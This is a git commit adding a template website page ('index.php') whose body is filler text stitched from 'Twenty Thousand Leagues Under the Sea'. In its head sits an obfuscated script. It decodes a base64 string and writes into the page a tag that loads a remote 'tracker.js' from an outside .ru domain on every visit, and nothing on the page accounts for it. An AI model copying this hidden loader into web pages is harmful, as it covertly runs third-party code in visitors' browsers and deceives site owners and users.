58b8843966855ab28da9cb72fe4be40cf4777c7c
uzfjidnx <77056708+uzfjidnx@users.noreply.github.com>
2021-01-06 14:21:26 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Sir, I answered, without seeking to know who you are, I recognize in you an artist.</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl82OTY2MXRkMjBsanQiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Sir, I answered, without seeking to know who you are, I recognize in you an artist.</h1>
+	</section>
+
+
+	<section class="our-work">
+		<h3 class="title">Quite so, Master Land; it was taking breath.</h3>
+		<p>Whether this person was thirty-five or fifty years of age, I could not say. He was tall, had a large forehead, straight nose, a clearly cut mouth, beautiful teeth, with fine tapered hands, indicative of a highly nervous temperament. This man was certainly the most admirable specimen I had ever met. One particular feature was his eyes, rather far from each other, and which could take in nearly a quarter of the horizon at once. No one knows. The boat went toward the south; the oarsmen did not hurry. I noticed that their strokes, strong in the water, only followed each other every ten seconds, according to the method generally adopted in the navy. While the craft was running by its own velocity, the liquid drops struck the dark depths of the waves crisply like spats of melted lead. A little billow, spreading wide, gave a slight roll to the boat, and some samphire reeds flapped before it. After having passed by the cage of the staircase that led to the platform, I saw a cabin six feet long, in which Conseil and Ned Land, enchanted with their repast, were devouring it with avidity. Then a door opened into a kitchen nine feet long, situated between the large storerooms. There electricity, better than gas itself, did all the cooking. The streams under the furnaces gave out to the sponges of platina a heat which was regularly kept up and distributed. They also heated a distilling apparatus, which, by evaporation, furnished excellent drinkable water. Near this kitchen was a bath-room comfortably furnished, with hot and cold water taps.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work">
+		<h3 class="title">Master, he said, I shall die if I do not t</h3>
+		<p>Yes, joker, said Ned Land. And one fine day the creature plunges, carrying with it all the inhabitants to the bottom of the sea. Friend Ned, asked Conseil, what would you have said if the breakfast had been entirely forgotten? How long I remained buried in this drowsiness I cannot judge; but when I woke, the sun seemed sinking toward the horizon. Captain Nemo had already risen, and I was beginning to stretch my limbs, when an unexpected apparition brought me briskly to my feet. Captain Nemo had chosen a strange moment for uttering this philosophical reflection. On the whole, his answer helped me little.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="title">We agreed to wait for an opportunity, continued Ned Land, and t</h3>	
+		<p>With my companions? I asked. It was a library. High pieces of furniture, of black violet ebony inlaid with brass, supported upon their wide shelves a great number of books uniformly bound. They followed the shape of the room, terminating at the lower part in huge divans, covered with brown leather, which were curved, to afford the greatest comfort. Light movable desks, made to slide in and out at will, allowed one to rest one's book while reading. In the center stood an immense table, covered with pamphlets, among which were some newspapers, already of old date. The electric light flooded everything; it was shed from four unpolished globes half sunk in the volutes of the ceiling. I looked with real admiration at this room, so ingeniously fitted up, and I could scarcely believe my eyes. In the midst of the mass of waters brightly lit up by the electric light glided some of those lampreys, more than a yard long, common to almost every climate. Some of the oxyrhynchi, a kind of ray five feet broad, with white belly and gray spotted back, spread out like a large shawl carried along by the current. Other rays passed so quickly that I could not see if they deserved the name of eagles which was given to them by the ancient Greeks, or the qualification of rats, toads, and bats, with which modern fishermen have loaded them. A few milander sharks, twelve feet long, and much feared by divers, struggled among them. Sea foxes eight feet long, endowed with wonderful fineness of scent, appeared like large blue shadows. Some dorades of the shark kind, some of which measured seven feet and a half, showed themselves in their dress of blue and silver, encircled by small bands which struck sharply against the somber tints of their fins, a fish consecrated to Venus, the eyes of which are incased in a socket of gold, a precious species, friend of all waters, fresh or salt, an inhabitant of rivers, lakes, and oceans, living in all climates, and bearing all temperatures; a race belonging to the geological era of the earth, and which has preserved all the beauty of its first days. Magnificent sturgeons, nine or ten yards long, creatures of great speed, striking the panes of glass with their strong tails, displayed their bluish backs with small brown spots; they resemble the sharks, but are not equal to them in strength, and are to be met with in all seas. But of all the diverse inhabitants of the Mediterranean, those I observed to the greatest advantage, when the Nautilus approached the surface, belonged to the sixty-third genus of bony fish. They were a kind of tunny, with bluish-black backs, and silvery breastplates, whose dorsal fins threw out sparkles of gold. They are said to follow in the wake of vessels, whose refreshing shade they seek from the fire of a tropical sky, and they did not belie the saying, for they accompanied the Nautilus as they did in former times the vessel of La Perouse. For many a long hour they struggled to keep up with our vessel. I was never tired of admiring these creatures really built for speed-their small heads, their bodies lithe and cigar-shaped, which in some were more than three yards long, their pectoral fins, and forked tail endowed with remarkable strength. They swam in a triangle, like certain flocks of birds, whose rapidity they equaled, and of which the ancients used to say that they understood geometry and strategy. But still they do not escape the pursuit of the provencals, who esteem them as highly as the inhabitants of the Propontis and of Italy used to do; and these precious but blind and foolhardy creatures perish by millions in the nets of the Marseillaise. And among the worthy people who have so kindly received us I revise my record of these adventures once more. Not a fact has been omitted, not a detail exaggerated. It is a faithful narrative of this incredible expedition in an element inaccessible to man, but to which Progress will one day open a road.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>091 Ross Loop, Suite 072, 90227-8448, South Fay, New Hampshire, United States</p>
+	</footer>
+
+</body>
+
+</html>
